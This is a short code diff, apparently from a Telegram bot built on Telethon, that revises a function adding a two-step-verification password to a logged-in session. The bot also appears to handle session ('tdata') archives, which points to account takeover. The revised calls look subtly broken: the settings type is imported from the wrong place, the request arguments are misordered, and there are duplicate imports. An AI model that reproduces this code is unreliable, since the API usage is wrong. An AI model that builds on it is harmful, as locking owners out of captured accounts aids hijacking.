@@ -103,7 +103,9 @@ async def check_2fa(client):
 from telethon.errors import PasswordHashInvalidError
 
 from telethon.tl.functions.account import UpdatePasswordSettingsRequest
-from telethon.tl.types import AccountPasswordInputSettings
+from telethon.tl.functions.account import UpdatePasswordSettingsRequest, GetPasswordRequest
+from telethon.tl.types import PasswordInputSettings
+from telethon.errors import PasswordHashInvalidError
 
 async def add_2fa(client, new_password: str, message):
     try:
@@ -111,21 +113,19 @@ async def add_2fa(client, new_password: str, message):
         if pw.has_password:
             return False, "Iɢɴᴏʀɪɴɢ 2FA, Sɪɴᴄᴇ ɪᴛ'ꜱ ᴀʟʀᴇᴀᴅʏ ꜱᴇᴛ"
 
-        settings = AccountPasswordInputSettings(
+        settings = PasswordInputSettings(
             new_password=new_password,
             new_hint="Set via bot",
-            email=None,
+            email=None
         )
 
-        await client(UpdatePasswordSettingsRequest(
-            password=settings
-        ))
-
+        await client(UpdatePasswordSettingsRequest(settings))
         return True, f"2FA Sᴇᴛ ᴛᴏ : {new_password}"
     except PasswordHashInvalidError:
         return False, "ᴇʀʀᴏʀ ɪɴ 2ꜰᴀ ᴀᴅᴅɪɴɢ PasswordHashInvalidError"
     except Exception as e:
         return False, f"ᴇʀʀᴏʀ ɪɴ 2ꜰᴀ ᴀᴅᴅɪɴɢ {e}"
+
 
 
 async def show_rar(tdata_path: str, message: Message, num):
